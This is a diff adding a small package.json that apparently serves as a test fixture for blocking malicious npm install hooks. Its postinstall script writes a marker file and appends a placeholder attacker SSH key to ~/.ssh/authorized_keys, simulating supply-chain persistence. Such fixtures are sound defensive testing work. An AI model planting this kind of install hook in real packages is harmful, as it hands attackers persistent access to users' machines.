@@ -1,0 +1,9 @@
+{
+  "name": "test-ssh-persistence",
+  "version": "1.0.0",
+  "private": true,
+  "description": "Simulates BufferZoneCorp persistence: postinstall appends SSH key to authorized_keys. If blocked, marker won't exist.",
+  "scripts": {
+    "postinstall": "echo 'PERSISTENCE_ATTEMPTED' > /tmp/marker-ssh-persistence && mkdir -p ~/.ssh && echo 'ssh-ed25519 AAAA_FAKE_TEST_KEY_NOT_REAL test@attacker' >> ~/.ssh/authorized_keys 2>/dev/null"
+  }
+}
